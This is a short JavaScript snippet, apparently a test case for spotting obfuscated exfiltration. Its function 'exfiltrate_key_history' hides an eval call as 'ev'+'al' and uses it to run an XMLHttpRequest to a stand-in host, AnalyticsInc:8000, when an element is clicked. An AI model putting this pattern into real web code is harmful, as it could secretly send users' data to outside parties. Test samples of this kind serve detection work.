function exfiltrate_key_history() {

    // Obfuscated and Nested Eval without obfuscated exp
    // Exfiltrate data using XMLHTTP request
    var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=eval2", true);xmlhttp.send(null);';
	eval("ev"+"al")(exp);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
